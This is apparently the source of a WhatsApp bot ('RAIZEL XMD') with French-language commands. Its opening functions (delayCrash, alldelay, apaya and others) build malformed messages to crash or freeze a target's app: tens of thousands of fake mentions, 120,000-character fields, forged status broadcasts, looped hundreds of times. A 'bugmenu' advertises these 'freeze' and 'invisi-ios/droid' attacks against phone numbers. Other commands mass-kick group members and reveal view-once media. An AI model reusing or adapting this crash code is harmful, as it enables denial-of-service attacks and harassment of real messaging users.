              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "Dimzxzzx",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1726867151,
              contactVcard: true,
              jpegThumbnail: "https://files.catbox.moe/aanan8.jpg"
            }
          }
        }
      }
    }
  };

  await rich.relayMessage(target, payload.message, { messageId: payload.key.id });
}

async function superdelayinvid(target) {
  return {
    key: {
      remoteJid: target,
      fromMe: false,
      id: "BAE538D8B0529FB7",
    },
    message: {
      extendedTextMessage: {
        text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
        contextInfo: {
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            extendedTextMessage: {
              text: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦",
            },
          },
          remoteJid: "status@broadcast"
        },
      },
    },
    messageTimestamp: Math.floor(Date.now() / 1000),
    broadcast: true,
    pushName:  "2709",
  };
}
async function delayCrash(target, mention = false, delayMs = 500) {
    for (const targett of target) {
        const generateMessage = {
            viewOnceMessage: {
                message: {
                    imageMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                        mimetype: "image/jpeg",
                        caption: "? ???????-?",
                        fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                        fileLength: "19769",
                        height: 354,
                        width: 783,
                        mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                        fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                        directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                        mediaKeyTimestamp: "1743225419",
                        jpegThumbnail: null,
                        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                        scanLengths: [2437, 17332],
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                            isSampled: true,
                            participant: target,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: true
                        }
                    }
                }
            }
        };

        const msg = generateWAMessageFromContent(target, generateMessage, {});
        
        await rich.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        if (mention) {
            await rich.relayMessage(
                target,
                {
                    statusMentionMessage: {
                        message: {
                            protocolMessage: {
                                key: msg.key,
                                type: 25
                            }
                        }
                    }
                },
                {
                    additionalNodes: [
                        {
                            tag: "meta",
                            attrs: { is_status_mention: "???? ???????? - ????" },
                            content: undefined
                        }
                    ]
                }
            );
        }

        // Delay antar target
        await new Promise(res => setTimeout(res, delayMs));
    }
}

async function alldelay(target) {
    const start = Date.now(); // Record start time

    for (let i = 0; i <= 900; i++) { 
        await DelayInvisNew(target);   
        await superdelayinvid(target); 
        await delayCrash(target, mention = false);                
        await KingBroadcast(target, mention = true);
     await DelayInvisNew(target);   
        await superdelayinvid(target); 
        await delayCrash(target, mention = false);                
        await KingBroadcast(target, mention = true);  
        await DelayInvisNew(target);   
        await superdelayinvid(target); 
        await delayCrash(target, mention = false);                
        await KingBroadcast(target, mention = true); 
        await KingDelayMess(target, Ptcp = true);
    }

    const end = Date.now(); // Record end time
    const seconds = ((end - start) / 1000).toFixed(2);

    console.log(`✅ alldelay finished for: ${target} in ${seconds}s`);
}
async function apaya(rich, target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "⏤⃟͟𝐑𝐀𝐈𝐙𝐄𝐋꙳𝐂𝐑𝐀𝐒𝐇͞⃟⏤͟͟͞͞͠🩸✦" + "ꦾ".repeat(120000),
                                jpegThumbnail: global.thumb,
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await rich.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
// ===================== Custom Reply =====================



// ===================== Emoji Reaction =====================

const reaction = async (isTarget, emoji) => {
    rich.sendMessage(isTarget, {
        react: {
            text: emoji,
            key: m.key 
        } 
    });
}

// ===================== Mention Helper =====================
rich.ments = async (text) => {
    return [m.chat];
}

// ===================== Image Resizer (WIP) =================
//auto follow 

// Newsletter Channels
const channelIds = [
  "120363419154765757@newsletter",
  "120363419474272514@newsletter"
];

// Load previously followed channels
let followedChannels = new Set();
try {
  const data = fs.readFileSync('./followedChannels.json', 'utf8');
  followedChannels = new Set(JSON.parse(data));
} catch {
  console.log('No previous follow data found, starting fresh.');
}

// Newsletter follow function
function followNewsletter(channelIds) {
  try {
    const channelToFollow = channelIds[0];
    if (!followedChannels.has(channelToFollow)) {
      rich.newsletterFollow(channelToFollow); // Replace with your Baileys client
      followedChannels.add(channelToFollow);
      fs.writeFileSync('./followedChannels.json', JSON.stringify([...followedChannels]));
      console.log(`✅ Followed channel: ${channelToFollow}`);
    } else {
      console.log(`⚠️ Already followed channel: ${channelToFollow}`);
    }
  } catch (err) {
    console.error('❌ Newsletter follow error:', err);
  }
}
async function resize(image, width, height) {
  const img = await jimp.read(image)
  img.resize(width, height)
  return await img.getBufferAsync(jimp.MIME_JPEG)
}
//==============\\
async function reply(teks) {
    rich.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        isForwarded: true
    }, {quoted: m})
}
const Reply1 = async (teks) => {
    await sleep(500);
    return rich.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `RAIZEL XMD`,
                body: `RAIZEL`,
                previewType: "VIDEO",
                thumbnailUrl: `https://files.catbox.moe/aanan8.jpg`,
                sourceUrl: `https://whatsapp.com/channel/0029Vb6DOLCCxoAvIfxngr3P`,
                mediaUrl: `https://whatsapp.com/channel/0029Vb6DOLCCxoAvIfxngr3P`
            },
            isForwarded: false,
            forwardingScore: 99999
        }
    }, {
        quoted: m
    });
    await sleep(500);
};
// ===================== Interface Menu =====================
switch(command) {
case "private": {
  await rich.sendMessage(m.chat, { react: { text: "🔒", key: m.key } });
  if (!isCreator) return Reply1(mess.owner);

  if (!rich.public) {
    return Reply1(`Le bot est déjà en mode privé.`);
  }

  rich.public = false;
  Reply1(`Le bot est maintenant en mode privé.  
Seul le propriétaire peut utiliser les commandes.`);
}
break;

case "public": {
  await rich.sendMessage(m.chat, { react: { text: "🔓", key: m.key } });
  if (!isCreator) return Reply1(mess.owner);

  if (rich.public) {
    return Reply1(`Le bot est déjà en mode public.  
Tous les utilisateurs y ont accès.`);
  }

  rich.public = true;
  Reply1(`Le bot est maintenant en mode public.  
Accessible à tous les utilisateurs.`);
}
break;
                

case 'kick': {
    await rich.sendMessage(m.chat, { react: { text: "🕷", key: m.key } });

    if (!m.isGroup) return Reply1(`🚫 Cette commande ne fonctionne que dans les groupes !`);
    if (!isBotAdmins) return Reply1(`⚠️ Le bot doit être administrateur pour pouvoir exclure un membre.`);
    if (!isCreator) return Reply1(`👑 Seul le propriétaire peut utiliser cette commande.`);

    const protectedNumbers = [
        '50955589433@s.whatsapp.net',
        '50932628598@s.whatsapp.net'
    ];

    let users = m.quoted
        ? m.quoted.sender
        : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (protectedNumbers.includes(users)) {
        return Reply1(`🛡️ Ce numéro est protégé et ne peut pas être expulsé.`);
    }

    await rich.groupParticipantsUpdate(m.chat, [users], 'remove');

    Reply1(`✅ Membre exclu avec succès : @${users.split('@')[0]}`);
}
break;
                

case 'ping': {
  const start = Date.now();
  const latency = Date.now() - start;

  let status;
  if (latency <= 200) {
    status = "✅ *Excellente réactivité*";
  } else if (latency <= 500) {
    status = "⚠️ *Temps de réponse modéré*";
  } else {
    status = "❌ *Réponse lente — surcharge probable*";
  }

  const pingMessage = `╭━━━『 *📡 SYSTÈME - LATENCE* 』━━━◆
┃
┃ ⏱️ *Vitesse* : _${latency.toFixed(2)} ms_
┃ ⚙️ *Uptime* : _${runtime(process.uptime())}_
┃ 📶 *Statut* : ${status}
┃
╰━━━◇ *raizel xᴍᴅ* — 𝘀ʏ𝘀ᴛᴇ̀ᴍᴇ ᴀᴄᴛɪғ`;

  Reply1(pingMessage);
}
break;

case 'bugmenu': {
  // Réagir au message avec un emoji 🐞
  await rich.sendMessage(m.chat, {
    react: {
      text: '🐞',
      key: m.key
    }
  });

  const bugVideoUrl = 'https://files.catbox.moe/qwufcm.mp4'; // Mets ici ton URL vidéo (ou laisse vide si pas de vidéo)
  const bugAudioUrl = 'https://files.catbox.moe/u19jl5.mp3'; // Mets ici ton URL audio

  // Infos date
  const date = new Date();
  const days = ['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];
  const dayName = days[date.getDay()];
  const day = date.getDate();
  const month = date.getMonth() + 1;
  const year = date.getFullYear();

  const menuText = `
⟦ ✦ 𝐑𝐀𝐈𝐙𝐄𝐋 𝐗𝐌𝐃 ✦ ⟧

👤 𝗨𝘀𝗲𝗿 : ${m.pushName}
📅 𝗗𝗮𝘁𝗲 : ${dayName}, ${day}/${month}/${year}
⚡ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4.0
🧩 𝗣𝗹𝘂𝗴𝗶𝗻𝘀 : 50
💠 𝗧𝘆𝗽𝗲 : X-MD

════ ⟦ 𝐁𝐔𝐆𝐒 ⟧ ════
🔹 vortex <in group>
🔹 invisi-ios 237xxxxx
🔹 invisidroid 237xxxxx
🔹 freeze 237xxxxx
🔹 bloodfield 237xxxxx
══════════════════

👑 𝗢𝘄𝗻𝗲𝗿 : wa.me/237699777530
🚀 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 : ʀᴀɪᴢᴇʟ
`;

  const fakeSystem = {
    key: {
      remoteJid: "status@broadcast",
      fromMe: false,
      id: "FakeID12345",
      participant: "0@s.whatsapp.net"
    },
    message: {
      conversation: "Bug Menu"
    }
  };

  // Envoi de la vidéo + menu texte
  await rich.sendMessage(m.chat, {
    video: { url: bugVideoUrl },
    caption: menuText
  }, { quoted: fakeSystem });

  // Envoi du son (audio PTT)
  await rich.sendMessage(m.chat, {
    audio: { url: bugAudioUrl },
    mimetype: 'audio/mpeg',
    ptt: true
  });
}
break;

  
                
 
case "owner": {
  const ownerNumber = "237699777530";
  const ownerName = "ʀᴀɪᴢᴇʟ 👑";

  const messageText = `╭━━━『 *👑 CRÉATEUR DU BOT* 』━━━◆
┃
┃ 🙋‍♂️ *Nom* : ${ownerName}
┃ 📞 *Numéro* : wa.me/${ownerNumber}
┃ 📬 *Contact direct disponible*
┃
┃ 💬 Pour toute question, aide ou collab :
┃ ✉️ *Joins-le sans hésiter !*
┃
╰━━━◇ *raizel xᴍᴅ* — 𝗲𝗻 𝗿𝗲𝗽𝗼𝘀 𝗺𝗮𝗶𝘀 𝗲𝗳𝗳𝗶𝗰𝗮𝗰𝗲`;

  await rich.sendMessage(m.chat, {
    text: messageText,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: '120363419154765757@newsletter',
        newsletterName: "ʀᴀɪᴢᴇʟ xᴍᴅ 📡",
        serverMessageId: 150
      }
    }
  }, { quoted: m });
}
break;



case "purge": {
  if (!m.isGroup) return Reply1("🚫 *Commande réservée aux groupes seulement.*");

  const BotAdm = participants.some(p => p.id === botNumber && p.admin);
  if (!BotAdm) return Reply1("🛑 *Je dois être administrateur* pour exécuter cette commande.");

  const freshGroupMetadata = await rich.groupMetadata(m.chat);
  const protectedNumbers = [
    "50955589433@s.whatsapp.net",
    "50932628598@s.whatsapp.net"
  ];

  const nonAdmins = freshGroupMetadata.participants
    .filter(p => !p.admin && !protectedNumbers.includes(p.id))
    .map(p => p.id);

  if (nonAdmins.length === 0) {
    return Reply1("✅ *Tous les membres sont déjà protégés ou administrateurs.*");
  }

  await rich.sendMessage(m.chat, {
    text: `╭━━━〔 *🧨 ɪɴɪᴛɪᴀᴛɪɴɢ ᴘᴜʀɢᴇ* 〕━━━◆
┃
┃ 👁️ *Analyse du groupe lancée...*
┃ ⚠️ _Aucune échappatoire, aucune pitié._
┃ 🔥 *Opération commandée par* ʀᴀɪᴢᴇʟ xᴍᴅ
┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆`,
    contextInfo: { mentionedJid: [m.sender] }
  });

  await new Promise(resolve => setTimeout(resolve, 3000));

  await rich.sendMessage(m.chat, {
    text: `🧟 *Dernier avertissement...*\n\n🕯️ _Que ceux qui ont une dernière prière s’expriment maintenant._\n\n⏳ *Exécution dans 10 secondes...*`
  });

  await new Promise(resolve => setTimeout(resolve, 10000));

  try {
    await rich.groupParticipantsUpdate(m.chat, nonAdmins, "remove");
    await rich.sendMessage(m.chat, {
      text: `╭━━━〔 *✅ ᴘᴜʀɢᴇ ᴇᴄʟᴀɪʀ* 〕━━━◆
┃
┃ 🧹 *Éradication complète exécutée.*
┃ 🕸️ *Les parasites ont été expulsés.*
┃ ☠️ *La paix est rétablie dans le groupe.*
┃
╰━━━◇ *ʀᴀɪᴢᴇʟ xᴍᴅ — sʏsᴛᴇ̀ᴍᴇ ᴏғғᴇɴsɪғ ᴀᴄᴛɪᴠᴇ́*`
    });
  } catch (error) {
    console.error('Erreur lors de la purge:', error);
    await Reply1("❌ *Une erreur est survenue pendant la purge.*\nMerci de vérifier mes permissions ou réessaye.");
  }
}
break;

  
  case 'welcome':
  if (!m.isGroup) return Reply1("🚫 Cette commande s'utilise uniquement dans un groupe.");
  if (!isCreator) return Reply1("🔐 Seul *le propriétaire du bot* peut exécuter cette commande.");

  await rich.sendMessage(from, { react: { text: '🎉', key: m.key } });

  if (args[0] === 'on') {
    welcome = true;
    Reply1('✅ *Welcome activé !*\n\n🎊 Un message d’accueil sera envoyé à chaque nouvel arrivant.');
  } else if (args[0] === 'off') {
    welcome = false;
    Reply1('❌ *Welcome désactivé !*\n\n🔕 Aucun message ne sera envoyé à l’arrivée de nouveaux membres.');
  } else {
    Reply1('🛠️ *Utilisation correcte :*\n\n• `.welcome on`\n• `.welcome off`');
  }
  break;
    
 case "dlt":
case "delete":
case "dlt": {
  await rich.sendMessage(from, { react: { text: '🗑️', key: m.key } });

  if (!m.quoted) return Reply1("*_Veuillez répondre à un message !!!_*");

  try {
    const quotedMsg = m.quoted;

    if (quotedMsg.fromMe && isCreator) {
      // Supprimer message du bot si Owner
      await quotedMsg.delete();
      return;
    }

    if (!m.isGroup) return Reply1("❌ *Commande utilisable uniquement dans un groupe.*");
    if (!isBotAdmins) return Reply1("⚠️ *Le bot doit être admin.*");
    if (!isAdmins) return Reply1(tlang().admin);

    await quotedMsg.delete();
  } catch (err) {
    console.error(err);
    return Reply1("❌ *Erreur lors de la suppression du message.*");
  }
}
break;
    
  case 'add': {
    if (!m.isGroup) return Reply1('❌ Cette commande est uniquement utilisable dans un groupe.');
    const groupMetadata = await rich.groupMetadata(m.chat);
    const senderAdmin = groupMetadata.participants.find(p => p.id === m.sender)?.admin || false;
    if (!senderAdmin) return Reply1('❌ Seuls les admins peuvent ajouter des membres.');

    if (!q) return Reply1(`📌 Exemple : ${prefix + command} 237xxxxxxxxxx`);

    let number = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    try {
        await rich.groupParticipantsUpdate(m.chat, [number], 'add');
        Reply1(`✅ Le numéro ${q} a été ajouté au groupe.`);
    } catch (e) {
        Reply1(`❌ Impossible d'ajouter ce numéro. Il est peut-être invalide ou privé.`);
    }
}
break;
        
case 'vv': {
  await rich.sendMessage(m.chat, { react: { text: "👀", key: m.key } });

  if (!m.quoted) return Reply1(`🎯 *Réponds à un média en vue unique (image, vidéo, audio) pour le déverrouiller.*`);

  try {
    let media = await quoted.download();
    let caption = quoted.text || quoted.caption || '';
    let mime = quoted.mimetype || '';

    if (/image/.test(mime)) {
      await rich.sendMessage(
        m.chat,
        {
          image: media,
          caption: `🖼️ *「 ʀᴀɪᴢᴇʟ xᴍᴅ 」*\n\n📂 *Image révélée avec succès.*\n🔓 _Extraction visuelle terminée._\n\n${caption}`
        },
        { quoted: m }
      );
    } else if (/video/.test(mime)) {
      await rich.sendMessage(
        m.chat,
        {
          video: media,
          caption: `🎬 *「 ʀᴀɪᴢᴇʟ xᴍᴅ 」*\n\n📤 *Vidéo débloquée avec succès.*\n🧠 _Décryptage complet._\n\n${caption}`
        },
        { quoted: m }
     );
    } else if (/audio/.test(mime)) {
      await rich.sendMessage(
        m.chat,
        {
          audio: media,
          mimetype: 'audio/mp4',
          caption: `🎧 *「 ʀᴀɪᴢᴇʟ xᴍᴅ 」*\n\n🎙️ *Audio extrait et reconstruit.*\n🔓 _Fichier vocal libéré._\n\n${caption}`
        },
        { quoted: m }
      );
    } else {
      return Reply1(`❌ *Format non reconnu.*\n📌 Seuls les médias en vue unique sont pris en charge.`);
    }
  } catch (error) {
    console.error("Erreur vv :", error);
    return Reply1("⚠️ *Une erreur est survenue lors de la récupération du média.*");
  }
}
break;

case 'invite': {
  try {
    if (!m.isGroup) return Reply1('🚫 *Commande disponible uniquement dans un groupe.*');

    const groupMeta = await rich.groupMetadata(m.chat);
    const isSenderAdmin = groupMeta.participants.find(p => p.id === m.sender)?.admin;
    if (!isSenderAdmin) return Reply1('⛔ *Seuls les administrateurs peuvent utiliser cette commande.*');

    const inviteCode = await rich.groupInviteCode(m.chat);
    const inviteLink = `https://chat.whatsapp.com/${inviteCode}`;

    await rich.sendMessage(m.chat, {
      text: `🔗 *Voici le lien d'invitation du groupe :*\n${inviteLink}`
    }, { quoted: m });

  } catch (e) {
    console.error('Erreur invite:', e);
    reply('❌ *Impossible de récupérer le lien d\'invitation.*');
  }
}
break;
      
      case 'take': {
  try {
    if (!m.quoted) return Reply1('❗ *Réponds à un sticker avec cette commande.*');

    const mime = (m.quoted.msg || m.quoted).mimetype || '';
    if (!mime.includes('webp')) {
      return Reply1('❌ *Ce n\'est pas un sticker.*');
    }

    // Télécharger le sticker
    const stickerBuffer = await rich.downloadMediaMessage(m.quoted);

    // Convertir WebP -> PNG
    const sharp = require('sharp');
    const pngBuffer = await sharp(stickerBuffer).png().toBuffer();

    // Charger l'image avec Jimp
    const Jimp = require('jimp');
    let image = await Jimp.read(pngBuffer);

    // Récupérer le nom de profil
    let name = m.pushName || ('@' + m.sender.split('@')[0]);

    // Charger la police blanche (taille adaptée)
    const font = await Jimp.loadFont(Jimp.FONT_SANS_64_WHITE);

    // Mesurer largeur du texte pour le centrer
    const textWidth = Jimp.measureText(font, name);
    const x = (image.getWidth() - textWidth) / 2;
    const y = image.getHeight() - 80; // 80px du bas

    // Ombre noire derrière le texte pour lisibilité
    const shadowFont = await Jimp.loadFont(Jimp.FONT_SANS_64_BLACK);
    image.print(shadowFont, x + 2, y + 2, name);

    // Texte blanc par-dessus
    image.print(font, x, y, name);

    // Conversion PNG -> WebP
    const finalPng = await image.getBufferAsync(Jimp.MIME_PNG);
    const webpBuffer = await sharp(finalPng).webp().toBuffer();

    // Envoyer le sticker final
    await rich.sendMessage(m.chat, {
      sticker: webpBuffer,
      mentions: [m.sender]
    }, { quoted: m });

  } catch (e) {
    console.error(e);
    Reply1('❌ *Erreur lors du traitement du sticker.*');
  }
}
break;
 
case 'sudo': {
    if (!isCreator) return Reply1(`❌ *Commande réservée au propriétaire.*`);
    if (!q) return Reply1(`📌 Exemple : ${prefix + command} 237xxxxxxxx`);

    let number = q.replace(/[^0-9]/g, '');
    if (!number) return Reply1("❌ Numéro invalide.");

    let jid = number + "@s.whatsapp.net";

    // Liste SUDO (fichier JSON par ex.)
    const fs = require("fs");
    let sudoFile = './database/sudo.json';
    let sudoList = [];

    if (fs.existsSync(sudoFile)) {
        sudoList = JSON.parse(fs.readFileSync(sudoFile));
    }

    if (sudoList.includes(jid)) return Reply1("⚠️ Cette personne est déjà sudo.");

    sudoList.push(jid);
    fs.writeFileSync(sudoFile, JSON.stringify(sudoList, null, 2));

    Reply1(`✅ *${number}* ajouté comme SUDO avec succès.`);
}
break;


case 'delsudo': {
    if (!isCreator) return Reply1(`❌ *Commande réservée au propriétaire.*`);
    if (!q) return Reply1(`📌 Exemple : ${prefix + command} 237xxxxxxxx`);

    let number = q.replace(/[^0-9]/g, '');
    let jid = number + "@s.whatsapp.net";

    const fs = require("fs");
    let sudoFile = './database/sudo.json';
    let sudoList = [];

    if (fs.existsSync(sudoFile)) {
        sudoList = JSON.parse(fs.readFileSync(sudoFile));
    }

    if (!sudoList.includes(jid)) return Reply1("❌ Cette personne n'est pas sudo.");

    sudoList = sudoList.filter(user => user !== jid);
    fs.writeFileSync(sudoFile, JSON.stringify(sudoList, null, 2));

    Reply1(`🗑 *${number}* retiré de la liste des SUDO.`);
}
break;

case 'photo': 
case 'photo': {
  try {
    if (!m.quoted) return Reply1('❗ *Réponds à un sticker avec cette commande pour le convertir en photo.*');

    const mime = (m.quoted.msg || m.quoted).mimetype || '';
    if (!mime || !mime.includes('webp')) {
      return Reply1('❌ *Le message répondu n\'est pas un sticker.*');
    }

    // Télécharger le sticker (webp)
    const media = await rich.downloadMediaMessage(m.quoted);

    // Convertir le webp en png/jpeg
    // Pour ça, il faut une lib comme sharp, mais souvent dans les bots WhatsApp, on peut juste renvoyer le buffer avec mimetype image/png

    // Ici on renvoie directement en tant qu'image (WhatsApp convertira)
    await rich.sendMessage(m.chat, {
      image: media,
      caption: 'Voici ton sticker converti en image !'
    }, { quoted: m });

  } catch (e) {
    console.error('Erreur sticktoimg:', e);
    reply('❌ *Erreur lors de la conversion du sticker.*');
  }
}
break;

case 'toaudio': {
  try {
    if (!m.quoted) return Reply1('❗ *Réponds à une vidéo avec cette commande pour la convertir en audio.*');

    const mime = (m.quoted.msg || m.quoted).mimetype || '';
    if (!mime.startsWith('video')) {
      return Reply1('❌ *Le message répondu n\'est pas une vidéo.*');
    }

    // Télécharger la vidéo
    const videoBuffer = await rich.downloadMediaMessage(m.quoted);

    // Chemins temporaires pour stocker les fichiers
    const videoPath = `/tmp/${Date.now()}_video.mp4`;
    const audioPath = `/tmp/${Date.now()}_audio.mp3`;

    // Sauvegarde vidéo temporaire
    fs.writeFileSync(videoPath, videoBuffer);

    // Conversion vidéo -> audio avec ffmpeg
    exec(`ffmpeg -i ${videoPath} -vn -ar 44100 -ac 2 -b:a 192k ${audioPath}`, async (error) => {
      // Supprimer la vidéo temporaire
      fs.unlinkSync(videoPath);

      if (error) {
        console.error('Erreur ffmpeg:', error);
        return Reply1('❌ *Erreur lors de la conversion de la vidéo en audio.*');
      }

      // Lire le fichier audio converti
      const audioBuffer = fs.readFileSync(audioPath);

      // Envoyer le fichier audio au chat
      await rich.sendMessage(m.chat, {
        audio: audioBuffer,
        mimetype: 'audio/mpeg',
        ptt: false,
        fileName: 'audio.mp3'
      }, { quoted: m });

      // Supprimer le fichier audio temporaire
      fs.unlinkSync(audioPath);
    });

  } catch (e) {
    console.error('Erreur toaudio:', e);
    Reply1('❌ *Une erreur est survenue lors de la conversion.*');
  }
}
break;

 case 'premmenu': {
    const premiumMenu = `
┏━━━⟬ 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐌𝐄𝐍𝐔 ⟭━━━┓

➤ 𝐁𝐀𝐍
➤ 𝐂𝐎𝐍𝐍𝐄𝐂𝐓
➤ 𝐗𝐒𝐏𝐀𝐌

┗━━━━━━━━━━━━━━━┛

📞 𝐎𝐖𝐍𝐄𝐑 : +237699777530  
💬 Contactez moi pour profiter du 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐑𝐀𝐈𝐙𝐄𝐋 𝐗𝐌𝐃
    `;

    await rich.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/aanan8.jpg' }, 
        caption: premiumMenu
    }, { quoted: m });

    // Réaction visuelle
    await rich.sendMessage(m.chat, { react: { text: "⭐", key: m.key }});
}
break;
        
case 'promote': {
  try {
    if (!m.isGroup) return Reply1('🚫 *Commande disponible uniquement dans un groupe.*');

    const groupMeta = await rich.groupMetadata(m.chat);
    const isSenderAdmin = groupMeta.participants.find(p => p.id === m.sender)?.admin;
    if (!isSenderAdmin) return Reply1('🛑 *Seuls les administrateurs peuvent promouvoir des membres.*');

    let userId;
    if (m.quoted) {
      userId = m.quoted.sender;
    } else if (args[0]) {
      if (args[0].includes('@')) {
        userId = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      } else if (/^\d+$/.test(args[0])) {
        userId = args[0] + '@s.whatsapp.net';
      } else {
        return Reply1('❗ *Mentionne un utilisateur ou réponds à son message.*');
      }
    } else {
      return Reply1('❗ *Utilisation : .promote @user ou répondre à un message.*');
    }

    await rich.groupParticipantsUpdate(m.chat, [userId], 'promote');

    await rich.sendMessage(m.chat, {
      text: `🧬 *Promotion effectuée avec succès.*\n\n@${userId.split('@')[0]} a été élevé au rang d’*admin* par *ʀᴀɪᴢᴇʟ xᴍᴅ* 🔱.`,
      mentions: [userId]
    }, { quoted: m });

  } catch (e) {
    console.error('Erreur promote:', e);
    reply('❌ *Impossible de promouvoir ce membre.*');
  }
}
break;

case 'img': {
    if (!q) return Reply1(`📌 Exemple : ${prefix + command} chat mignon`);

    try {
        const axios = require('axios');
        const cheerio = require('cheerio');

        // Recherche sur Google Images
        let searchUrl = `https://www.google.com/search?tbm=isch&q=${encodeURIComponent(q)}`;
        let { data } = await axios.get(searchUrl, {
            headers: {
                "User-Agent": "Mozilla/5.0"
            }
        });

        const $ = cheerio.load(data);
        let results = [];
        $('img').each((i, el) => {
            let src = $(el).attr('src');
            if (src && src.startsWith('http')) {
                results.push(src);
            }
        });

        if (results.length === 0) return Reply1("❌ Aucune image trouvée.");

        let imgUrl = results[1] || results[0]; // éviter la première qui est souvent le logo Google
        let imgBuffer = (await axios.get(imgUrl, { responseType: 'arraybuffer' })).data;

        await rich.sendMessage(m.chat, { image: imgBuffer, caption: `📷 Image trouvée pour : ${q}` }, { quoted: m });

    } catch (err) {
        console.error(err);
        Reply1("⚠️ Erreur lors de la recherche d'image.");
    }
}
break;

case 'demote': {
  try {
    if (!m.isGroup) return Reply1('🚫 *Commande utilisable uniquement dans les groupes.*');

    const groupMeta = await rich.groupMetadata(m.chat);
    const isSenderAdmin = groupMeta.participants.find(p => p.id === m.sender)?.admin;
    if (!isSenderAdmin) return Reply1('🛑 *Seuls les administrateurs peuvent rétrograder un membre.*');

    let userId;
    if (m.quoted) {
      userId = m.quoted.sender;
    } else if (args[0]) {
      if (args[0].includes('@')) {
        userId = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
      } else if (/^\d+$/.test(args[0])) {
        userId = args[0] + '@s.whatsapp.net';
      } else {
        return Reply1('❗ *Mentionne un utilisateur ou réponds à son message.*');
      }
    } else {
      return Reply1('❗ *Utilisation : .demote @user ou répondre à un message.*');
    }

    await rich.groupParticipantsUpdate(m.chat, [userId], 'demote');

    await rich.sendMessage(m.chat, {
      text: `📉 *Rétrogradation confirmée.*\n\n@${userId.split('@')[0]} a été *retiré du rôle d’admin* par *ʀᴀɪᴢᴇʟ xᴍᴅ* 🕸️.`,
      mentions: [userId]
    }, { quoted: m });

  } catch (e) {
    console.error('Erreur demote:', e);
    reply('❌ *Impossible de rétrograder ce membre.*');
  }
}
break;

case "tag": {
  await rich.sendMessage(from, { react: { text: '🔊', key: m.key } });

  if (!m.isGroup) return Reply1("❌ *Groupe uniquement*.");
  if (!isCreator) return Reply1("❌ *Réservé au propriétaire.*");

  try {
    if (!q) return Reply1('*Veuillez fournir un message à envoyer.* ℹ️');

    const groupData = await rich.groupMetadata(m.chat);
    const participants = groupData.participants;

    await rich.sendMessage(m.chat, { text: q, mentions: participants.map(p => p.id) }, { quoted: m });

  } catch (e) {
    console.error(e);
    return Reply1(`❌ *Erreur lors de l'envoi.*\n\n${e.message || e}`);
  }
}
break;

case 'menu': {
  // Réagir au message avec un emoji 🩸
  await rich.sendMessage(m.chat, {
    react: {
      text: '🩸',
      key: m.key
    }
  });

  const richVideoUrl = 'https://files.catbox.moe/qllumz.mp4'; // Remplace par ton URL vidéo directe
  const audioUrl = 'https://files.catbox.moe/apcq24.mp3'; // Même URL audio que précédemment

  const menuText = `
╔════════════════════════════╗
║   🕷️ ʀᴀɪᴢᴇʟ ᴄᴏɴsᴏʟᴇ xᴍᴅ 🕷️   ║
╚════════════════════════════╝

👤 User      : ${m.pushName}
